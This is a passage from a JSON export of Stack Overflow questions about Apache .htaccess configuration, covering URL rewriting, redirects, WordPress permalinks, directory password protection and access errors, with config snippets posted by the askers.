On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ $1.php [L]\nRewriteRule ^([^/]+)/$ view_image.php?rand=$1 [L]\n</code></pre>\n\n<p>Can someone please tell me why this will not work?</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":38,"score":2,"question_id":13214531,"title":"Passing $_GET variables to virtual directories via .htaccess","body":"<p>I have the following <code>.htaccess</code> <b>Rewrite rule</b> below which works for converting virtual directories to parameters, for example: </p>\n\n<p><code>www.example.com/usa/ny/nyc</code> gets interpreted by PHP as <code>www.example.com/index.php?path=usa/ny/nyc</code>. </p>\n\n<p>What I can't seem to figure out is how I would change my <code>regex</code> below to handle parameters of the virtual directories themselves. For example, I want: </p>\n\n<p><code>www.example.com/usa/ny/nyc/?display=off&amp;settings=none</code> to be seen by PHP as <code>www.example.com/index.php?path=usa/ny/nyc&amp;param=display:off,settings:none</code>. </p>\n\n<p>What makes it extra tricky is that the parameters won't always be those two options I used in the example above, they will change dynamically. Any ideas or suggestions of how to go about accomplishing this?</p>\n\n<pre><code>RewriteRule ^/?([a-zA-Z_\\-/]+)$ index.php?path=$1 [L]  \n</code></pre>\n"},{"tags":["wordpress",".htaccess","permalinks","file-not-found"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":12410921,"title":"Permalinks in Wordpress - Page not found","body":"<p>I've been searching for hours but haven't found anything the solves this problem.</p>\n\n<p>Here's the scenario:</p>\n\n<p>I'm making a wp theme based on the \"Twenty Eleven\" theme. Everything went fine til I decided to change the urls to permalinks. The only page being displayed is the static page that I have defined earlier. </p>\n\n<p>I have set up the htacces file. In fact, WP did it automatically. Everything works if I switch back to the default setting, but, for SEO, I would rather use the permalinks option.</p>\n\n<p>Here is my htaccess file (it is on my WP installation folder):</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /mysite/\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /mysite/index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n\n<p>I have seen this post <a href=\"http://stackoverflow.com/questions/2157279/wordpress-htaccess-with-permalinks\">wordpress .htaccess with permalinks</a> but nothing there could help me. Any help would be very nice.</p>\n\n<p><strong>UPDATE :</strong> Things I have tried already:</p>\n\n<ul>\n<li>Delete pages and create again.</li>\n<li>Access the permalink field on wp_options (db) and setting the value to blank and set the permalink option in the admin again.</li>\n<li>I´m running it on windows 7 through an apache2 installation of Zend Server.</li>\n<li>I thought it was a problem related to my localhost environment, so I put the site online. No luck at all. I'm assuming that wordpress can´t change permalinks to a more friendly url type when you set a static front page. What a shame.</li>\n</ul>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13214121,"title":"htaccess redirect url with different folders and parameters","body":"<p>I would like to redirect a url in <code>.htaccess</code> from: </p>\n\n<pre><code>domain_name.com/folder/index.php?param=0  \n</code></pre>\n\n<p>to:</p>\n\n<pre><code>domain_name.com/another_folder/page.html  \n</code></pre>\n\n<p>How this can be achieved?  </p>\n"},{"tags":["php",".htaccess",".htpasswd"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":140,"score":-1,"question_id":11815121,"title":"How can I use md5 passwords in .htpasswd file?","body":"<p>Hi I am trying to set up a <code>.htaccess</code> and a <code>.htpasswd</code> file to see if a user can have access to a particular directory. When a new user registers, their passwords are encrypted with the PHP <code>md5()</code> function and then stored in the database with their other login info. I would like to add a few of their encrypted passwords into my <code>.htpasswd</code> file dynamically so that they can enter into a sub member section. I am having trouble because the <code>.htpasswd</code> file would work with passwords encrypted with the <code>crypt()</code> function but i am not sure how to get it to work with their md5 encrypted passwords.</p>\n"},{"tags":["php",".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13214093,"title":".htaccess redirection with query string to human readable url","body":"<p>I have a url: <em><code>www.abc.com/change.php</code></em>. </p>\n\n<p>Parameters value is passed in post through <code>$_POST[param]</code>.</p>\n\n<p>I want to convert it to MVC like url through <code>.htaccess</code> such that:</p>\n\n<p><em><code>www.abc.com/change.php</code></em> with <code>$_POST[\"height\"]</code> redirects to <em><code>www.abc.com/change/height</code></em> </p>\n\n<p>and: </p>\n\n<p><em><code>www.abc.com/change.php</code></em> with <code>$_POST[\"width\"]</code> redirects to <em><code>www.abc.com/change/width</code></em>.</p>\n\n<p>How should my <code>.htaccess</code> file be changed for it?</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":13213478,"title":"Configuring .htaccess for subdirectories","body":"<p>Hello I don't know much about the <code>.htaccess</code> configuration, but I want to restrict access to php files on my web server and I want to have only <em><code>index.php</code></em> with parameters accessible. </p>\n\n<p>My files are in subfolder like: <em><code>www.mydomain.com/sub/index.php</code></em>. I want to have access to open that <em><code>index.php</code></em> in subfolder, css files and js files. </p>\n\n<p>Here is my configuration I have so far:</p>\n\n<pre><code>  Order Deny,Allow\n  Deny from all\n  Allow from 127.0.0.1\n\n  &lt;Files /index.php&gt;\n    Order Allow,Deny\n    Allow from all\n  &lt;/Files&gt;\n  &lt;FilesMatch \"*\\.(css|js)$\"&gt;\n    Order Allow,Deny\n    Allow from all\n  &lt;/FilesMatch&gt;\n</code></pre>\n\n<p>I have tried to do something like <code>&lt;Files sub/index.php&gt;</code> but everytime it restricts all php files in subfolders and <em><code>www.mydomain.com/index.php</code></em> works fine.</p>\n\n<p>Can anyone help me with it?</p>\n"},{"tags":[".htaccess","google","fetch","blank","tools"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":13213239,"title":"SEO: Google fetch returns blank page (but rendered HTML seems correct)","body":"<p>I usually find all the answers to my question but this time I could not find any. This if actually the first time I post on stackoverflow!\nHere is my problem.</p>\n\n<p>The root of my website: \"www.example.com\" returns a blank (not empty) page when I use Google Webmaster Tools to fetch my website. When I look at the rendered HTML, it is exactly what it should be, but the preview of the page is just blank.</p>\n\n<p>All the other pages of my website like \"www.example.com/sample_page.html\" seem to give the proper preview though. I have even tried to make a redirection (htaccess) of the root domain \"www.example.com\" to \"www.example.com/sample_page.html\" but it also gives a blank preview.</p>\n\n<p>I use cached HTML files so it does not have anything to do with enabled JS or whatsoever. Furthermore, like I told you, the rendered HTML seems OK it's just the preview that does not return anything.</p>\n\n<p>Any hint is greatly appreciated as I have been trying to find a solution since a few weeks now.</p>\n"},{"tags":["php",".htaccess","php.ini"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":19,"score":1,"question_id":13213034,"title":"folder php.ini override main php.ini","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/7781927/overriding-global-php-ini-file\">Overriding global php.ini file</a>  </p>\n</blockquote>\n\n\n\n<p>I have looked but can't seem to find an answer.\nI am loading a php.ini file from my web root and wanted to know if it only contains one line, does that override the main php.ini e.g.:</p>\n\n<pre><code>include_path = \".:/usr/lib/php:/usr/local/lib/php:/home/folder_name/include_folder\"\n</code></pre>\n\n<p>is the only line in the file.</p>\n\n<p>Thanks</p>\n"},{"tags":["javascript",".htaccess","cross-domain","xss"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3433,"score":0,"question_id":10599590,"title":"Allow: Domains, protocols and ports must match","body":"<p>I have two domains </p>\n\n<p>domain1.com and domain2.com </p>\n\n<p>I want to allow any cross domain scripting or communication between these two domains. How can I do it so that i do not get any cross domain errors while using content between these two domains?</p>\n\n<p>Also want to access pages through iframe and run scripts through iframes between these two domains.</p>\n\n<p>Regards,</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13212369,"title":"always have issues with htaccess","body":"<p>I am trying to short out one issue with my htaccess.</p>\n\n<pre><code>   RewriteBase /\n   RewriteRule ^(.+)/$ /$1 [R=301,L]\n   RewriteRule ^profile/(.*)$ details.php?profile=$1 [L,NC,QSA]\n   RewriteRule ^industry/(.*)$ category.php?industry=$1 [L,NC,QSA]\n\n   RewriteCond %{REQUEST_FILENAME} !-f\n   RewriteCond %{REQUEST_FILENAME} !-d \n   RewriteRule ^index.php$ /index.php [L,NC]\n</code></pre>\n\n<p>it work fine as long as there is profile or industry match.. but now what i want to achieve is when above no rule matches then it should redirect user to home page (www.example.com). what is happening is it redirect me to index.php but the problem is on browser it still shows (www.example.com/skfjsf/sfjsfk) i want to change it to (www.example.com)</p>\n"},{"tags":["apache",".htaccess","rest","httprequest"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":19,"score":2,"question_id":13209304,"title":"RESTful Application .htaccess error","body":"<p>I'm working on a backbone.js application (just for reference) and I can submit requests to <code>controller.php</code> for processing. I have a switch statement on the <code>REQUEST_METHOD</code> and it works as expected with <code>GET</code>, <code>POST</code>, <code>PUT</code> and <code>DELETE</code>.</p>\n\n<p>However, when I use the following <code>.htaccess</code> file:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond  %{REQUEST_FILENAME} !-f\nRewriteCond  %{REQUEST_FILENAME} !-d\nRewriteRule ^/?controller/([^/]+)$ /controller.php?id=$1 [L]\n</code></pre>\n\n<p>...and pass to <code>controller/5</code> instead of <code>controller.php?id=5</code> I get a 405 error - method not allowed.</p>\n\n<p>I've been digging through Google and asking colleagues and can't find a solution.</p>\n"},{"tags":["php",".htaccess","rest"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13212219,"title":"htaccess Not Sending Parameter in header","body":"<p>I have the following in my <code>htaccess</code>:</p>\n\n<pre><code>RewriteRule ^controller/?$ controller.php [L]\nRewriteRule ^controller/(.*)?$ controller.php?id=$1 [L]\n</code></pre>\n\n<p>It seems to work fine when I send a vanilla <code>GET</code> request to the controller, however, when I send through something like a <code>DELETE</code> request to <code>controller/5</code> I don't see the ID passed through the header and I'm not able to access it in the script (php).</p>\n"},{"tags":[".htaccess","pyrocms"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":159,"score":0,"question_id":11264015,"title":"PyroCMS - Assets class doesn't minify and combine","body":"<p>I have some problem with the Assets class to minify and combine my css and js.\nI have this plugin ad it seems to work without problem:</p>\n\n<p>\n\n<pre><code>class Plugin_Theme_Assets extends Plugin\n{\n    /**\n    * combine and insert multiple js files\n    *\n    * usage:\n    * { theme_assets:js_files files=\"file1.js,file2.js\" }\n    */\n    function js_files()\n    {\n        $files = $this-&gt;attribute('files');\n        preg_match_all('/[\\w-\\.]+\\.js/i', $files, $files_a);\n        foreach($files_a[0] as $file)\n        {\n            Asset::js($file);\n        }\n        return Asset::render_js();\n    }\n\n    /**\n    * combine and insert multiple css files\n    *\n    * usage:\n    * { theme_assets:css_files files=\"file1.css,file2.css\" }\n    */\n    function css_files()\n    {\n        $files = $this-&gt;attribute('files');\n        preg_match_all('/[\\w-\\.]+\\.css/i', $files, $files_a);\n        foreach($files_a[0] as $file)\n        {\n            Asset::css($file);\n        }\n        return Asset::render_css();\n    }\n}\n</code></pre>\n\n<p>This is my .htaccess file and as you can si i have uncomment the SetEnv:</p>\n\n<pre><code># Multiple Environment config\n# Set this to development, staging or production\n  SetEnv PYRO_ENV production\n\n&lt;IfModule mod_rewrite.c&gt;\n\n    # Make sure directory listing is disabled\n    Options +FollowSymLinks -Indexes\n    RewriteEngine on\n\n    # NOTICE: If you get a 404 play with combinations of the following commented out lines\n    #AllowOverride All\n    RewriteBase /\n\n    # Restrict your site to only one domain\n    # !important USE ONLY ONE OPTION\n\n    # Option 1: To rewrite \"www.domain.com -&gt; domain.com\" uncomment the following lines.\n    RewriteCond %{HTTPS} !=on\n    RewriteCond %{HTTP_HOST} ^www\\.(.+)$ [NC]\n    RewriteRule ^(.*)$ http://%1/$1 [R=301,L]\n\n    # Option 2: To rewrite \"domain.com -&gt; www.domain.com\" uncomment the following lines.\n    #RewriteCond %{HTTPS} !=on\n    #RewriteCond %{HTTP_HOST} !^www\\..+$ [NC]\n    #RewriteCond %{HTTP_HOST} (.+)$ [NC]\n    #RewriteRule ^(.*)$ http://www.%1/$1 [R=301,L]\n\n    # Remove index.php from URL\n    #RewriteCond %{HTTP:X-Requested-With}   !^XMLHttpRequest$\n    #RewriteCond %{THE_REQUEST}             ^[^/]*/index\\.php [NC]\n    #RewriteRule ^index\\.php(.*)$           $1 [R=301,NS,L]\n\n    # Keep people out of codeigniter directory and Git/Mercurial data\n    RedirectMatch 403 ^/(system\\/cms\\/cache|system\\/codeigniter|\\.git|\\.hg).*$\n\n    # Send request via index.php (again, not if its a real file or folder)\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n\n    &lt;IfModule mod_php5.c&gt;\n        RewriteRule ^(.*)$ index.php/$1 [L]\n    &lt;/IfModule&gt;\n\n    &lt;IfModule !mod_php5.c&gt;\n        RewriteRule ^(.*)$ index.php?/$1 [L]\n    &lt;/IfModule&gt;\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>so, if i'm right the PYRO_ENV now is \"production\".</p>\n\n<p>If i refresh my page the css and the js file are not minify and combine into a single file...\nHere what the plugin return</p>\n\n<pre><code>&lt;link href=\"http://example:8888/addons/default/themes/mytheme/css/nivo-slider.css\" rel=\"stylesheet\" type=\"text/css\" /&gt;\n&lt;link href=\"http://example:8888/addons/default/themes/mytheme/css/default.css\" rel=\"stylesheet\" type=\"text/css\" /&gt;\n</code></pre>\n\n<p>Can you please help me?</p>\n"},{"tags":["apache",".htaccess","rewrite","mod"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13211346,"title":".htaccess causes links on page to try an open a BIN file?","body":"<p>My friend's site which I agree to tech-advise, is psychtalkonline.com. You can go check it out, it's an anonymous forum (miniBBS) running Apache on Unix. I at first had a problem with mod_rewrite but then I uploaded the .htaccess file. However, that seemed to cause problems. If you click on any link, you will get a pop-up saying:</p>\n\n<pre><code>\"You have chosen to open which is a BIN file\"\n</code></pre>\n\n<p>If you click the source code, and  click on the links in the source code, you will see that it goes to the BIN file. I'm not really sure what's going on. I really would appreciate some help.</p>\n\n<p>Thanks.</p>\n\n<p>All of my source code can be found here: <a href=\"https://github.com/Dalloway/MiniBBS\" rel=\"nofollow\">https://github.com/Dalloway/MiniBBS</a></p>\n\n<p>*<strong>*I think I figured it out, mod_rewrite is not on www.psychtalkonline.com/test.php**</strong></p>\n"},{"tags":["apache",".htaccess","mod-rewrite","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":2,"view_count":43,"score":2,"question_id":13209954,"title":".htaccess rewrite imgname.jpg to image.php?img=imgname","body":"<p>I am attempting to rewrite URLs like the following:</p>\n\n<pre><code>domain.com/news/12/imgname.jpg\n</code></pre>\n\n<p>to</p>\n\n<pre><code>domain.com/image.php?img=12/imgname\n</code></pre>\n\n<p>I am using the following in my .htaccess file, but it does not seem to be working:</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} -f\nRewriteRule ^news/([0-9]+\\/.*)\\.jpg$ image.php?img=$1 [L]\n</code></pre>\n\n<p>Can anyone help me see what I've done wrong?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":12,"score":1,"question_id":13208852,"title":"Mod_rewrite with constant parameter following the $1 variable","body":"<p>I'm trying to change via mod_rewrite the URL example.com/username/progress to example.com/username/?id=progress using the following code:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)/progress /$1/?id=progress [QSA]\n</code></pre>\n\n<p>Any ideas why it's returning a 500 error?</p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":13208330,"title":"Redirection with htaccess","body":"<p>How can I redirect the following using htaccess<br/> \n<a href=\"http://www.example.com/test/index/?lang=bollywood\" rel=\"nofollow\">http://www.example.com/test/index/?lang=bollywood</a> <br/>\n   to<br/>\n<a href=\"http://www.example.com/bollywood/test/index\" rel=\"nofollow\">http://www.example.com/bollywood/test/index</a></p>\n\n<p>The argument value passed in the query string of lang needs to be the first argument after domain name.</p>\n"},{"tags":["apache",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":178,"score":1,"question_id":9593746,"title":"Redirecting domain without WWW to the same with WWW","body":"<p>I'm trying to redirect a domain without WWW to the same domain with WWW at the same path with Apache.</p>\n\n<p>So my .htaccess is:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST} ^mydomain\\.com\\.ar$ [NC]\nRewriteRule ^(.*)$ http://www.mydomain.com.ar/$1 [R=301,L]\n</code></pre>\n\n<p>But the redirection, for example, by requesting \"http://mydomain.com.ar/myimage.jpg\" results on this URL: \"http://www.mydomain.com.ar/mydomain.com.ar/myimage.jpg\".</p>\n\n<p>What am I doing wrong?</p>\n\n<p><b>EDIT:</b> Sorry, but was my problem, I am pointing domain in cPanel to the subdirectory public_html/mydomain.com.ar (public_html is also accessible), using the same .htaccess but in that subdirectory actually works.</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":33,"score":-1,"question_id":13207308,"title":"rewrite a url in htaccess","body":"<p>hello i have a url in which i want to hide the foldername (rewrite) it with some other name </p>\n\n<p>the url is </p>\n\n<pre><code>http://www.example.com/wp-content/download/shm.mp4\n</code></pre>\n\n<p>to</p>\n\n<pre><code>http://www.example.com/wp-content/locked/shm.mp4\n</code></pre>\n\n<p>whenever i put <code>http://www.example.com/wp-content/locked/shm.mp4</code> it get the file from <code>download</code> folder with the same url of <code>locked</code> . Can anyone help me with this ?</p>\n\n<p>i tried the following but it didnt worked. i know i am doin it wrong as i really never did it before. But i still tried it</p>\n\n<pre><code>RewriteCond %{THE_REQUEST} ^GET\\ /download/\nRewriteRule ^locked/(.*) /locked/$1 [L,R=301]\n</code></pre>\n"},{"tags":["php",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13206961,"title":"setup a .htaccess file to auto check user logged in and start download","body":"<p>Hello.  I have a website with slides. A user is able to play slides and download them if they are members. I implemented a system in which even if the user or any person who is not a member or not logged in he/she would get an auth setup by me in the .htaccess i placed in the folder. The sample code is somewhat like as follows:</p>\n\n<pre><code>Auth_MySQL on\nAuthName \"Members Only\"\nAuthType Basic\nAuthGroupFile /dev/null\nAuth_MySQL_Host localhost\nAuth_MySQL_DB user\nAuth_MySQL_User user\nAuth_MySQL_Password e2xample\nAuth_MySQL_Password_Table member\nAuth_MySQL_Username_Field username\nAuth_MySQL_Password_Field password\nAuth_MySQL_Encryption_Types Plaintext\nAuth_MySQL_Password_Clause \"AND username != '' AND password != ''\"\nrequire valid-user\n</code></pre>\n\n<p>This helps providing a good security, but i have a problem that when a player in the website tries to access the slide file it also gives an auth before it grants access to file. I have seen some websites which send some random hash that could help validate the user with the file name. I just want that it does not ask for auth and detect whether the user is already logged in and give access to the file. Is that possible? Or would there be any other method i should know ?</p>\n"},{"tags":["apache",".htaccess",".htpasswd"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":25,"score":5,"question_id":13204442,"title":"password protect multiple directories via htaccess","body":"<p>I am able to password protect directories via the htaccess file at the root of my site (I have to use one htaccess file in my site root because of my CMS). The issue I'm having is assigning users to each directory I want to protect. I can create multiple users and password protect multiple directories, but any user will work for any protected directory. For example:</p>\n\n<p>example.com/section-one should be private and accessed by user \"one\".</p>\n\n<p>example.com/section-two should be private and accessed by user \"two\". </p>\n\n<p>However any user will work on either section and once users log into one they have access to the others without being asked for a password. I know it is an issue with my htaccess file. I tried using  but can't seem to figure out the formatting. All the information online shows how to do this for files, but directories just isn't as easy to find help on. </p>\n\n<p>I am using this: </p>\n\n<pre><code>&lt;IfModule mod_authn_file.c&gt;\nSetEnvIf Request_URI \"^/section-one.*$\" private\nAuthName \"Password Needed\"\nAuthGroupFile /dev/null\nAuthType Basic\nAuthUserFile /www/server/.htpasswd\nRequire user one\nOrder Deny,Allow\nDeny from env=private\nSatisfy any\n&lt;/IfModule&gt;\n\n&lt;IfModule mod_authn_file.c&gt;\nSetEnvIf Request_URI \"^/section-two.*$\" private\nAuthName \"Password Needed\"\nAuthGroupFile /dev/null\nAuthType Basic\nAuthUserFile /www/server/.htpasswd\nRequire User two\nOrder Deny,Allow\nDeny from env=private\nSatisfy any\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["apache",".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12454340,"title":"About using .htaccess file","body":"<p>hope you are dong fine.</p>\n\n<p>I have have a subfolder in my public_html folder.\nIn the subfolder, I have a .htaccess file with the following code:</p>\n\n<pre><code># Disable indexing:\nOptions All -Indexes\n# Ignore every file:\nIndexIgnore *\n# Prevent access to any file:\n&lt;FilesMatch \"^.*$\"&gt;\nOrder Allow,Deny\nDeny from all\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>Now when I browse to the subfolder, for example, <em>www.mysite.com/subfolder/myfile.php</em>, I shown my site's index.html page!\nCan this really be happening?!</p>\n\n<p>Can someone please tell me what I need to do to show a generic \"Access not allowed\" page?</p>\n\n<p>Thanks in advance for your help.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":13,"score":1,"question_id":13206170,"title":"RewriteRule to access folder outside public folder","body":"<p>I have 2 files:</p>\n\n<pre><code>root_folder/public_html/.htaccess\nroot_folder/whatever/index.html\n</code></pre>\n\n<p>Is there a way to config htaccess so that I will receive index.html when browsing <a href=\"http://mydomain.com\" rel=\"nofollow\">http://mydomain.com</a>?</p>\n"},{"tags":[".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13205845,"title":"How to rewrite domainname.com/index.php/dir/controller/?var1=abc&var2=def","body":"<p>How to rewrite <code>domainname.com/index.php/dir/controller/?var1=abc&amp;var2=def</code></p>\n\n<p>to </p>\n\n<p><code>domainname.com/rewrite-string/abc/def/</code>?</p>\n\n<p><code>domainname.com/rewrite-string/abc/def/</code> is link that user put to browser address bar </p>\n\n<p>and server will redirect it to <code>domainname.com/index.php/dir/controller/?var1=abc&amp;var2=def</code>.</p>\n"},{"tags":[".htaccess","url-rewriting","rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":15,"score":1,"question_id":13205986,"title":"how to rewrite the url using HTACCESS?","body":"<p>My HTACCESS file working perfectly on my local server, but its not work in my sever.</p>\n\n<p>in my HTACCESS File</p>\n\n<pre><code>Options FollowSymLinks\nRewriteEngine On\nRewriteRule   ^index/?$   http://www.vividkerala.com/index.php  [NC]\n</code></pre>\n\n<p>its just redirect instead of rewrite.</p>\n\n<p>did i make any mistake? pls help me..</p>\n"},{"tags":[".htaccess","mod-rewrite","ssl","https"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":14,"score":-1,"question_id":13205869,"title":".htaccess redirect custom conditions","body":"<p>My main problem is getting the RewriteCond correct. Here's what I intend to do.</p>\n\n<ol>\n<li>If the protocol is SSL (<code>https</code>) strip off <code>www.</code> in the beginning of the request if there.</li>\n<li>If its just <code>http</code>, add <code>www.</code> to request if not there</li>\n<li>If the referer is using <code>https</code> redirect to a <code>https</code> url</li>\n<li>Force <code>https://domain.com/url</code> for certain urls</li>\n</ol>\n\n<p>Why I need this:</p>\n\n<ul>\n<li>All <code>www.</code> requests go through a CDN and CDN does not provide a SSL protocol.</li>\n<li>Hence when there is a HTTP request, send it through CDN by forcing <code>www.</code>, if not strip <code>www.</code> to send it directly to server.</li>\n<li>Referer needs checking to make all static resources like images, sent through a <code>https</code> protocol, to resolve partial SSL error that may come.</li>\n<li>Certain URLs like <code>domain.com/login</code>, etc have to be on SSL</li>\n</ul>\n\n<p>I tried playing with it, but it seems I could never get the right RewriteCond for all the conditions.</p>\n"},{"tags":[".htaccess","codeigniter","web-hosting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":378,"score":0,"question_id":4600662,"title":"codeigniter problem login through IE, Safari, Chrome?","body":"<p>everything works fine in localhost but i have a problem login from other browsers like safari and chrome, in firefox its ok. may be it is because of htaccess or may be other. i tried a lot searching but come to no solution. my htaccess file look like this.</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\n\n\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\nRewriteCond %{REQUEST_URI} ^application.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    ErrorDocument 404 /index.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>my server folder hirarchy looks like this</p>\n\n<pre><code>public_html\nL application\n  system\n  css\n  images\n  .htaccess\n</code></pre>\n\n<p>application/config/config.php looks like this</p>\n\n<pre><code>$config['index_page'] = \"index.php?\";\n$config['uri_protocol'] = 'QUERY_STRING';\n</code></pre>\n\n<p>i have used hmvc too.\nany help?</p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13204990,"title":"htaccess causing a redirect loop","body":"<p>Could anyone explain to me what the following .htaccess is doing, as with it in place i am getting a redirect loop.</p>\n\n<pre><code>    # environment\n#SetEnv APPLICATION_ENV development\nSetEnv APPLICATION_ENV production\n\n#detect mod_rewrite\nSetEnv HTTP_MOD_REWRITE On\n\n# charset\nAddDefaultCharset UTF-8\n\n# front\n&lt;IfModule mod_rewrite.c&gt;\nSetEnv HTTP_MOD_REWRITE On\nRewriteEngine on\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ -         [NC,L]\nRewriteRule ^api api.php   [NC,L]\nRewriteRule ^.*$ /index.php [NC,L]\n&lt;/IfModule&gt;\n\n&lt;ifmodule mod_deflate.c&gt;\nAddOutputFilterByType DEFLATE text/text text/html text/plain text/xml text/css application/x-javascript application/javascript\n&lt;/ifmodule&gt;\n\nOptions -Indexes\nIndexIgnore *\n</code></pre>\n\n<p>This is hosted on a Cpanel server, and the domain in question is a subdomain. I am trying to get useResponse working, and this htaccess ships with it.</p>\n\n<p>Any help would be great.</p>\n\n<p>Thanks.</p>\n"},{"tags":["php","windows","apache",".htaccess","windows-8"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13203608,"title":"Apache 403 (Forbidden) on subdirectory on Windows","body":"<p>So yesterday i installed Apache 2.2, PHP 5.3, and MySQL on my Windows 8 Machine.  I am using the same vhost / .htaccess files on both but it works on my Mac and not Windows.  Basically When i go to \"mysite.dev\" it renders the homepage of the site, but once i go to any page, such as \"mysite.dev/about/\" i get a 403 Forbidden Error.</p>\n\n<p>I have verified that Apache runs as \"System\" on my computer and then made sure all permissions from the site folder to root are set to Full Access for the user/group System.</p>\n\n<p>I've tried many many things and cant figure this out and its rather annoying.  Anyways i've posted below all of the settings / logs.  Thanks in advanced.</p>\n\n<p><strong>vhosts:</strong></p>\n\n<pre><code>&lt;VirtualHost *:80&gt;\n    ServerAdmin MyEmail@gmail.com\n    DocumentRoot \"C:/Users/Michael/Dropbox/Sites/onmytv\"\n    ServerName onmytv.dev\n    ServerAlias www.onmytv.dev\n\n    &lt;Directory \"C:/Users/Michael/Dropbox/Sites/onmytv\"&gt;\n        Options Indexes FollowSymLinks MultiViews\n        AllowOverride All\n        Order Deny,Allow\n        Allow from all\n    &lt;/Directory&gt;\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p><strong>.htaccess:</strong></p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ %{DOCUMENT_ROOT}/index.php/$1 [L]\n</code></pre>\n\n<p><strong>Error displayed on webpage:</strong></p>\n\n<pre><code>Forbidden\n\nYou don't have permission to access /C:/Users/Michael/Dropbox/Sites/onmytv/index.php/about/ on this server.\n</code></pre>\n\n<p><strong>error.log</strong></p>\n\n<pre><code>[error] [client 127.0.0.1] (20023)The given path was above the root path: Cannot map GET /about/ HTTP/1.1 to file\n</code></pre>\n\n<p><strong>access.log</strong></p>\n\n<pre><code>127.0.0.1 - - [02/Nov/2012:17:57:17 -0400] \"GET /about/ 